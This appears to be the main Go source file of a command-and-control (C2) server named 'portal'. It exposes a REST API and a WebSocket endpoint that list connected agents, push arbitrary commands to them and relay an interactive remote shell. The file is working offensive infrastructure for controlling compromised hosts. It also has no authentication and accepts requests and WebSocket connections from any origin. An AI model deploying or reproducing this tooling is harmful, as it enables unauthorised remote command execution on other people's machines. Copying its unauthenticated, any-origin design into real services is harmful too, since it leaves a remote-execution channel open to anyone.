package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"sync"
	"syscall"
	"time"

	"portal/pkg/server"
	pb "portal/proto"

	"github.com/gorilla/mux"
	"github.com/gorilla/websocket"
)

// CORS middleware to allow cross-origin requests
func corsMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		// Set CORS headers
		w.Header().Set("Access-Control-Allow-Origin", "*")
		w.Header().Set("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
		w.Header().Set("Access-Control-Allow-Headers", "Content-Type, Authorization")

		// Check if it's a preflight request
		if r.Method == "OPTIONS" {
			w.WriteHeader(http.StatusOK)
			return
		}

		// Call the next handler
		next.ServeHTTP(w, r)
	})
}

// WebSocket upgrader
var upgrader = websocket.Upgrader{
	ReadBufferSize:  1024,
	WriteBufferSize: 1024,
	CheckOrigin: func(r *http.Request) bool {
		return true // Allow all origins in development
	},
}

// Interactive shell session
type ShellSession struct {
	AgentID  string
	WSConn   *websocket.Conn
	Done     chan struct{}
	CmdMutex sync.Mutex
}

// WebSocket message
type WSMessage struct {
	Input  string `json:"input,omitempty"`
	Output string `json:"output,omitempty"`
	Error  string `json:"error,omitempty"`
}

func main() {
	// Parse command line flags
	addr := flag.String("addr", "0.0.0.0:50051", "The server address in the format of host:port")
	webAddr := flag.String("web", "0.0.0.0:8080", "The web server address in the format of host:port")
	flag.Parse()

	// Create a new C2 server
	c2Server := server.NewC2Server()
	api := NewAPI(c2Server)

	// Create a router for the REST API
	router := mux.NewRouter()

	// Apply CORS middleware
	router.Use(corsMiddleware)

	// Define API routes
	router.HandleFunc("/api/agents", func(w http.ResponseWriter, r *http.Request) {
		agents := api.GetAgents()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(agents)
	}).Methods("GET", "OPTIONS")

	// Add endpoint for sending commands to agents
	router.HandleFunc("/api/agents/{agentId}/command", func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		agentId := vars["agentId"]

		if r.Method == "POST" {
			var cmdReq struct {
				Command string `json:"command"`
				Type    string `json:"type"`
			}

			// Decode request body
			if err := json.NewDecoder(r.Body).Decode(&cmdReq); err != nil {
				http.Error(w, "Invalid request body", http.StatusBadRequest)
				return
			}

			log.Printf("Received command request for agent %s: %s (type: %s)",
				agentId, cmdReq.Command, cmdReq.Type)

			// Get agent from server
			agent, exists := c2Server.GetAgent(agentId)
			if !exists {
				http.Error(w, "Agent not found", http.StatusNotFound)
				return
			}

			// Create command
			cmdId := fmt.Sprintf("cmd-%d", time.Now().UnixNano())
			cmd := &pb.Command{
				Id:          cmdId,
				CommandType: cmdReq.Type,
				Payload:     []byte(cmdReq.Command),
				Timestamp:   time.Now().Unix(),
			}

			// Send command to agent
			err := c2Server.SendCommandToAgent(agentId, cmd)
			if err != nil {
				http.Error(w, err.Error(), http.StatusInternalServerError)
				return
			}

			// Wait for response with timeout
			select {
			case resp := <-agent.Responses:
				// Check if this is the response to our command
				if resp.CommandId == cmdId {
					w.Header().Set("Content-Type", "application/json")
					json.NewEncoder(w).Encode(map[string]interface{}{
						"success": resp.Success,
						"result":  string(resp.Result),
						"error":   resp.ErrorMessage,
					})
					return
				}
			case <-time.After(10 * time.Second):
				http.Error(w, "Command timed out", http.StatusGatewayTimeout)
				return
			}

			http.Error(w, "No response received", http.StatusInternalServerError)
		} else {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		}
	}).Methods("POST", "OPTIONS")

	// Add WebSocket endpoint for interactive shell
	router.HandleFunc("/api/agents/{agentId}/shell", func(w http.ResponseWriter, r *http.Request) {
		vars := mux.Vars(r)
		agentId := vars["agentId"]

		// Check if agent exists
		agent, exists := c2Server.GetAgent(agentId)
		if !exists {
			http.Error(w, "Agent not found", http.StatusNotFound)
			return
		}

		// Upgrade connection to WebSocket
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Printf("Failed to upgrade to WebSocket: %v", err)
			return
		}

		// Create shell session
		session := &ShellSession{
			AgentID: agentId,
			WSConn:  conn,
			Done:    make(chan struct{}),
		}

		log.Printf("WebSocket shell session established for agent %s", agentId)

		// Handle interactive shell session
		handleShellSession(session, c2Server, agent)
	}).Methods("GET", "OPTIONS")

	// Set up signal handling for graceful shutdown
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)

	// Start the C2 server in a goroutine
	c2ErrCh := make(chan error, 1)
	go func() {
		log.Printf("Starting C2 server on %s", *addr)
		if err := c2Server.Start(*addr); err != nil {
			c2ErrCh <- err
		}
	}()

	// Start the web server in a goroutine
	webErrCh := make(chan error, 1)
	go func() {
		log.Printf("Starting web server on %s", *webAddr)
		if err := http.ListenAndServe(*webAddr, router); err != nil {
			webErrCh <- err
		}
	}()

	// Wait for server to exit or receive a signal
	select {
	case err := <-c2ErrCh:
		log.Fatalf("C2 server error: %v", err)
	case err := <-webErrCh:
		log.Fatalf("Web server error: %v", err)
	case sig := <-sigCh:
		log.Printf("Received signal: %v, shutting down...", sig)
	}
}

// Handle interactive shell WebSocket session
func handleShellSession(session *ShellSession, c2Server *server.C2Server, agent *server.Agent) {
	defer func() {
		session.WSConn.Close()
		close(session.Done)
		log.Printf("WebSocket shell session closed for agent %s", session.AgentID)
	}()

	// Initialize the shell
	initShellCmd := &pb.Command{
		Id:          fmt.Sprintf("shell-init-%d", time.Now().UnixNano()),
		CommandType: "interactive",
		Payload:     []byte(""),
		Timestamp:   time.Now().Unix(),
	}

	// Send the initialization command to the agent
	if err := c2Server.SendCommandToAgent(session.AgentID, initShellCmd); err != nil {
		sendWSError(session.WSConn, fmt.Sprintf("Failed to initialize shell: %v", err))
		return
	}

	// Wait for initial shell response
	select {
	case resp := <-agent.Responses:
		if !resp.Success {
			sendWSError(session.WSConn, fmt.Sprintf("Failed to initialize shell: %s", resp.ErrorMessage))
			return
		}
	case <-time.After(5 * time.Second):
		sendWSError(session.WSConn, "Timeout waiting for shell initialization")
		return
	}

	// Start a goroutine to read from WebSocket and send commands to agent
	go func() {
		for {
			// Read message from WebSocket
			_, message, err := session.WSConn.ReadMessage()
			if err != nil {
				log.Printf("WebSocket read error: %v", err)
				return
			}

			// Parse the message
			var wsMsg WSMessage
			if err := json.Unmarshal(message, &wsMsg); err != nil {
				log.Printf("Invalid WebSocket message: %v", err)
				continue
			}

			// Handle user input
			if wsMsg.Input != "" {
				log.Printf("Received input from WebSocket for agent %s: %s", session.AgentID, wsMsg.Input)

				// Create input command
				session.CmdMutex.Lock()
				inputCmd := &pb.Command{
					Id:          fmt.Sprintf("input-%d", time.Now().UnixNano()),
					CommandType: "input",
					Payload:     []byte(wsMsg.Input),
					Timestamp:   time.Now().Unix(),
				}

				// Send the input to the agent
				if err := c2Server.SendCommandToAgent(session.AgentID, inputCmd); err != nil {
					log.Printf("Failed to send input to agent: %v", err)
					sendWSError(session.WSConn, fmt.Sprintf("Failed to send input: %v", err))
				}
				session.CmdMutex.Unlock()
			}
		}
	}()

	// Poll for agent output
	outputTicker := time.NewTicker(100 * time.Millisecond)
	defer outputTicker.Stop()

	for {
		select {
		case <-session.Done:
			return

		case <-outputTicker.C:
			// Request output from agent
			session.CmdMutex.Lock()
			outputCmd := &pb.Command{
				Id:          fmt.Sprintf("output-%d", time.Now().UnixNano()),
				CommandType: "output",
				Payload:     []byte(""),
				Timestamp:   time.Now().Unix(),
			}

			// Send output request to agent
			if err := c2Server.SendCommandToAgent(session.AgentID, outputCmd); err != nil {
				log.Printf("Failed to request output: %v", err)
				session.CmdMutex.Unlock()
				continue
			}
			session.CmdMutex.Unlock()

			// Wait for response
			select {
			case resp := <-agent.Responses:
				if resp.Success && len(resp.Result) > 0 {
					// Send output to WebSocket
					wsMsg := WSMessage{
						Output: string(resp.Result),
					}
					if err := session.WSConn.WriteJSON(wsMsg); err != nil {
						log.Printf("WebSocket write error: %v", err)
						return
					}
				}
			case <-time.After(500 * time.Millisecond):
				// Timeout, continue polling
			}
		}
	}
}

// Send WebSocket error message
func sendWSError(conn *websocket.Conn, errMsg string) {
	wsMsg := WSMessage{
		Error: errMsg,
	}
	if err := conn.WriteJSON(wsMsg); err != nil {
		log.Printf("Failed to send error to WebSocket: %v", err)
	}
}